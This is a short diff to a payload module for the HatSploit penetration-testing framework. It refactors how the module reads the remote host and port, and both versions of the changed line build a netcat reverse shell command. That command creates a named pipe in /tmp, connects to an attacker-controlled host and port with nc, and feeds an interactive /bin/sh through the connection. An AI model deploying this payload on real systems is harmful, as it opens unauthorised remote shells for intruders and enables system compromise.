@@ -3,7 +3,7 @@ This payload requires HatSploit: https://hatsploit.com
 Current source: https://github.com/EntySec/HatSploit
 """
 
-from hatsploit.lib.payload import Payload
+from hatsploit.lib.payload.basic import *
 from pex.string import String
 
 
@@ -25,10 +25,7 @@ class HatSploitPayload(Payload, String):
         }
 
     def run(self):
-        remote_host = self.handler['RHOST']
-        remote_port = self.handler['RPORT']
-
         filename = self.random_string(8)
-        payload = f"mkfifo /tmp/{filename}; nc {remote_host} {remote_port} 0</tmp/{filename} | /bin/sh >/tmp/{filename} 2>&1; rm /tmp/{filename}"
+        payload = f"mkfifo /tmp/{filename}; nc {self.rhost.value} {self.rport.value} 0</tmp/{filename} | /bin/sh >/tmp/{filename} 2>&1; rm /tmp/{filename}"
 
         return payload
